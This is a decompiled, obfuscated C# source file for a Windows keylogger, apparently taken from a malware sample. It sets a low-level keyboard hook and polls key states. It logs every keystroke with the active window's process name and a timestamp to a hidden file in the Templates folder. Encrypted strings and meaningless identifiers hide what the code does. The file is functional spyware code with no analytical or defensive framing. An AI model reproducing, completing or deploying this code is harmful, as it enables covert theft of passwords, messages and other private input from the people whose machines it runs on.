using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace O;

public class GClass0
{
	private struct Struct0
	{
		public uint uint_0;

		public uint uint_1;

		public Enum0 enum0_0;

		public uint uint_2;

		public UIntPtr uintptr_0;
	}

	[Flags]
	private enum Enum0 : uint
	{

	}

	private delegate int Delegate0(int int_0, IntPtr intptr_0, IntPtr intptr_1);

	private Delegate0 delegate0_0;

	private string string_0;

	private int int_0;

	private bool[] bool_0;

	public string TNIeSkTiKSewKwVSUFJtudX;

	public int ODKmQfrvmbnqGFWFWZPFErT;

	public bool MuLpocHdDgSmEJvYvKShgaS;

	public string JpMtPZTLRlvjCMYqXtVNLJQ;

	private Class18.Struct14 struct14_0;

	internal IntPtr intptr_0;

	internal StreamWriter streamWriter_0;

	public GClass0()
	{
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		JpMtPZTLRlvjCMYqXtVNLJQ = "";
		MuLpocHdDgSmEJvYvKShgaS = false;
		ODKmQfrvmbnqGFWFWZPFErT = 10240000;
		TNIeSkTiKSewKwVSUFJtudX = Conversions.ToString(GClass1.smethod_0((object)GClass2.smethod_0(Environment.SpecialFolder.Templates, 'ʗ', 713), method_4(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf5f9\uf5c1\uf5c4\uf5d1\uf5c4\uf58b\uf5e1\uf5e4\uf5f1", 60257), 63067), 59614), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﲏﲞﲨﲞﲼﲨﲟﲬﲍﲔﲈﲕﲿﲸﲩﲱﲖﲞﲝﲘﲲﲠﲞ", 63176), 58247), 59824)), (short)100, 107));
		struct14_0.bool_0 = false;
		bool_0 = new bool[256];
		struct14_0.keys_0 = (Keys)0;
		delegate0_0 = method_3;
		IntPtr intPtr = (intptr_0 = IntPtr.Zero);
	}

	[DllImport("user32")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_1, uint uint_2, IntPtr intptr_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_1);

	private string method_0()
	{
		DateTime dateTime_ = GForm0.smethod_2<Clock>(Class11.smethod_2<ServerComputer>((ServerComputer)Class6.Object_3, '\u000f', (short)31), (short)339, (short)319);
		return Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue295\ue2ee\ue295", 59377), 62240), 63199) + Class14.smethod_3(Class11.smethod_3(ref dateTime_, 862, 854), '(', '0') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("老", 59546), 61996), 58236) + Class14.smethod_3(Class11.smethod_3(ref dateTime_, 435, 442), 'ɾ', 'ɦ') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("老", 59546), 61996), 58236) + Class14.smethod_3(Class11.smethod_3(ref dateTime_, 943, 933), 'ϙ', 'ρ') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf75e\uf753\uf75e", 63252), 58165), 58132) + Class14.smethod_3(Class12.smethod_4(ref dateTime_, 629, 614), 'ɓ', 'ɋ') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee95", 61341), 57885), 58351) + Class14.smethod_3(Class11.smethod_3(ref dateTime_, 641, 650), '\u02e5', '\u02fd') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee95", 61341), 57885), 58351) + Conversions.ToString(dateTime_.Second) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue561\ue51c", 57966), 61522), 63332);
	}

	private string method_1()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			Process gparam_ = Class11.smethod_5(int_, 'ʗ', 694);
			if ((Class3.smethod_1(ref foregroundWindow, '»', 233) == int_0) & (Class11.smethod_7(string_0, Class5.smethod_3(gparam_, 528, 533), bool_0: false, 'Ͻ', 'υ') == 0))
			{
				return "";
			}
			int_0 = Class3.smethod_1(ref foregroundWindow, '\u0300', 850);
			string_0 = Class5.smethod_3(gparam_, 768, 773);
			return GClass2.smethod_1(new string[5]
			{
				Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0c9\uf0ce\uf0c9\uf0ce\uf0e7\uf0b8\uf0e4\uf09f", 61878), 57668), 57373),
				string_0,
				Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf03d", 62464), 59269), 58114),
				method_0(),
				Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue553\ue50f\ue550\ue57e\ue579", 61044), 60568), 59282)
			}, 1016, 'ΐ');
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_0(uint uint_0)
	{
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return (string)(IEquatable<string>)"";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = 0;
			IntPtr intptr_ = Class12.smethod_5(GetKeyboardLayout(GetWindowThreadProcessId(foregroundWindow, ref int_)), 'ʪ', 'ʨ');
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return (string)(IEquatable<string>)GForm1.smethod_7(stringBuilder, '*', '\u0015');
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, 'ʱ', 662);
			Class5.smethod_4('ű', 260);
		}
		Keys val = (Keys)checked((int)uint_0);
		return (string)(IEquatable<string>)((Enum)(Keys)(ref val)).ToString();
	}

	private string method_2(Keys keys_0)
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Invalid comparison between Unknown and I4
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected I4, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Invalid comparison between Unknown and I4
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Invalid comparison between Unknown and I4
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Invalid comparison between Unknown and I4
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Invalid comparison between Unknown and I4
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Expected I4, but got Unknown
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c7: Expected I4, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_023f: Invalid comparison between Unknown and I4
		//IL_0241: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Invalid comparison between Unknown and I4
		//IL_0249: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0305: Expected I4, but got Unknown
		//IL_031f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0325: Expected I4, but got Unknown
		bool flag = GForm1.smethod_8<Keyboard>(Class5.smethod_6<Computer>((Computer)Class6.Object_3, 'Ƽ', 425), '\f', 85);
		if (Class12.smethod_6<Keyboard>(Class5.smethod_6<Computer>((Computer)Class6.Object_3, '\u0375', 864), 683, '\u02e7'))
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			Keys val = keys_0;
			if ((int)val <= 35)
			{
				if ((int)val <= 9)
				{
					if ((int)val == 8)
					{
						goto IL_01cc;
					}
					if ((int)val == 9)
					{
						if (struct14_0.keys_0 == keys_0)
						{
							return (string)(IConvertible)"";
						}
						return (string)(IConvertible)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue38c\ue383\ue396\ue387\ue38a\ue3da\ue3dd", 59587), 60880), 59031);
					}
				}
				else
				{
					switch (val - 13)
					{
					case 0:
						goto IL_0116;
					case 1:
					case 2:
						goto IL_0251;
					case 3:
					case 4:
						goto IL_0287;
					}
					if ((int)val == 32)
					{
						return (string)(IConvertible)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue9a6\ue9ae\ue98d\ue99c\ue99e\ue998\ue9a0", 58441), 63496), 62945);
					}
					if ((int)val == 35)
					{
						goto IL_01cc;
					}
				}
			}
			else if ((int)val <= 163)
			{
				if ((int)val == 46)
				{
					goto IL_01cc;
				}
				switch (val - 112)
				{
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 11:
					goto IL_01cc;
				}
				switch (val - 160)
				{
				case 0:
				case 1:
				case 2:
				case 3:
					goto IL_0287;
				}
			}
			else if ((int)val == 65536 || (int)val == 131072 || (int)val == 262144)
			{
				goto IL_0287;
			}
			goto IL_0251;
			IL_0116:
			if (struct14_0.keys_0 == keys_0)
			{
				return (string)(IConvertible)"";
			}
			return (string)(IConvertible)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("･ｻｰｪｻｬ｣ＳＴ", 62710), 57380), 60339);
			IL_0287:
			return (string)(IConvertible)Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf77a", 60143), 63442), 59949), ((Enum)(Keys)(ref keys_0)).ToString(), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf03d", 62464), 59269), 58114), 171, 253);
			IL_0251:
			checked
			{
				if (flag)
				{
					return (string)(IConvertible)Class3.smethod_2(smethod_0((uint)keys_0), 191, 227);
				}
				return (string)(IConvertible)smethod_0((uint)keys_0);
			}
			IL_01cc:
			return (string)(IConvertible)Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf77a", 60143), 63442), 59949), ((Enum)(Keys)(ref keys_0)).ToString(), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf03d", 62464), 59269), 58114), 467, 389);
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, '\n', 45);
			string result;
			if (flag)
			{
				result = (string)(IConvertible)Strings.ChrW((int)keys_0).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = (string)(IConvertible)Strings.ChrW((int)keys_0).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_1, ref int int_1);

	[DllImport("user32", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int CallNextHookEx(int int_1, int int_2, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int SetWindowsHookEx(int int_1, Delegate0 delegate0_1, IntPtr intptr_1, int int_2);

	public void WRK()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			JpMtPZTLRlvjCMYqXtVNLJQ = Class3.smethod_2(TNIeSkTiKSewKwVSUFJtudX, 241, 175);
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, 'ł', 357);
			Class5.smethod_4('8', 77);
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys val = (Keys)num2;
							string text = (string)(ICloneable)method_2(val);
							if (GClass2.DRV.smethod_1(text, 270, 336) > 0)
							{
								ref string jpMtPZTLRlvjCMYqXtVNLJQ = ref JpMtPZTLRlvjCMYqXtVNLJQ;
								jpMtPZTLRlvjCMYqXtVNLJQ = GClass1.smethod_3(jpMtPZTLRlvjCMYqXtVNLJQ, method_1(), 620, 553);
								ref string jpMtPZTLRlvjCMYqXtVNLJQ2 = ref JpMtPZTLRlvjCMYqXtVNLJQ;
								jpMtPZTLRlvjCMYqXtVNLJQ2 = GClass1.smethod_3(jpMtPZTLRlvjCMYqXtVNLJQ2, text, 219, 158);
							}
							Keys keys_ = val;
							struct14_0.keys_0 = keys_;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = 20480;
						if (GClass2.DRV.smethod_1(JpMtPZTLRlvjCMYqXtVNLJQ, 708, 666) > 20480)
						{
							JpMtPZTLRlvjCMYqXtVNLJQ = JpMtPZTLRlvjCMYqXtVNLJQ.Remove(0, JpMtPZTLRlvjCMYqXtVNLJQ.Length - num3);
						}
						File.WriteAllText(TNIeSkTiKSewKwVSUFJtudX, JpMtPZTLRlvjCMYqXtVNLJQ);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private int method_3(int int_1, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (int_1 == 0)
			{
				Struct0 @struct = default(Struct0);
				if (!GForm1.smethod_11(intptr_1, Class12.smethod_5(256, '\u0016', '\u0014'), 209, 233) && !GForm1.smethod_11(intptr_1, Class12.smethod_5(260, 'ʼ', 'ʾ'), 206, 246))
				{
					if (GForm1.smethod_11(intptr_1, Class12.smethod_5(257, 'ȋ', 'ȉ'), 761, 705) || GForm1.smethod_11(intptr_1, Class12.smethod_5(261, '\u0006', '\u0004'), 1007, 983))
					{
						object obj = GClass1.smethod_6(intptr_2, GClass2.DRV.smethod_5((object)@struct, 282, 'Ņ'), 886, 879);
						Struct0 obj2 = ((obj != null) ? ((Struct0)obj) : default(Struct0));
						Keys val = (Keys)(int)obj2.uint_0;
						bool_0[val] = false;
					}
				}
				else
				{
					object obj3 = GClass1.smethod_6(intptr_2, GClass2.DRV.smethod_5((object)@struct, 762, 'ʥ'), 467, 458);
					Struct0 obj4 = ((obj3 != null) ? ((Struct0)obj3) : default(Struct0));
					Keys val2 = (Keys)(int)obj4.uint_0;
					bool_0[val2] = true;
				}
			}
			return CallNextHookEx((int)IntPtr.Zero, int_1, intptr_1, intptr_2);
		}
	}

	public void Close(bool DeleteJpMtPZTLRlvjCMYqXtVNLJQ)
	{
		struct14_0.bool_0 = true;
		while (MuLpocHdDgSmEJvYvKShgaS)
		{
			Thread.Sleep(1);
		}
		if (DeleteJpMtPZTLRlvjCMYqXtVNLJQ)
		{
			Class11.smethod_4(1000, '2', 98);
			try
			{
				GForm0.smethod_3(TNIeSkTiKSewKwVSUFJtudX, 65, 96);
			}
			catch (Exception gparam_)
			{
				GForm1.smethod_6(gparam_, 'ȟ', 568);
				Class5.smethod_4('ǔ', 417);
			}
			JpMtPZTLRlvjCMYqXtVNLJQ = "";
		}
		struct14_0.bool_0 = false;
	}

	private object method_4(string string_1, string string_2)
	{
		string text = (string)(IConvertible)"";
		int num = GClass2.DRV.smethod_1(string_2, 440, 485);
		checked
		{
			short num2 = (short)GForm1.smethod_3(string_1, 699, 751);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text = (string)(IConvertible)GClass1.smethod_3(text, GClass1.smethod_2(Class12.smethod_3(num ^ GClass2.DRV.smethod_1(GClass1.smethod_1(string_1, num3, 1, 84, 17), 684, 753), 992, 942), 978, 'π'), 662, 723);
			}
			return text;
		}
	}

	public void Start()
	{
		if (!MuLpocHdDgSmEJvYvKShgaS)
		{
			try
			{
				JpMtPZTLRlvjCMYqXtVNLJQ = Class3.smethod_2(TNIeSkTiKSewKwVSUFJtudX, 825, 871);
			}
			catch (Exception gparam_)
			{
				GForm1.smethod_6(gparam_, 'Ä', 227);
				Class5.smethod_4('ƽ', 456);
			}
			StreamWriter streamWriter = (streamWriter_0 = Class4.smethod_9(TNIeSkTiKSewKwVSUFJtudX, 'Ǜ', 498));
			Class10.smethod_8(streamWriter_0, bool_0: true, 333, 'Ķ');
			IntPtr intPtr = (intptr_0 = (IntPtr)SetWindowsHookEx(13, delegate0_0, (IntPtr)smethod_2(smethod_1(GForm1.smethod_2(595, 'Ƀ'), 558, 599)[0], 484, 419).ToInt32(), 0));
			new Thread(WRK, 1).Start();
		}
	}

	internal static Module[] smethod_1<T>(T gparam_0, int int_1, short short_0) where T : Assembly
	{
		int num = 0;
		Module[] result;
		do
		{
			result = (((short_0 ^ int_1) - 121) ^ num) switch
			{
				0 => (Module[])(Array)gparam_0.GetModules(), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static IntPtr smethod_2<T>(T gparam_0, short short_0, short short_1) where T : Module
	{
		int num = 0;
		IntPtr result = (((short_0 ^ short_1) - 71) ^ 0) switch
		{
			0 => Marshal.GetHINSTANCE(gparam_0), 
			_ => default(IntPtr), 
		};
		num++;
		return result;
	}
}
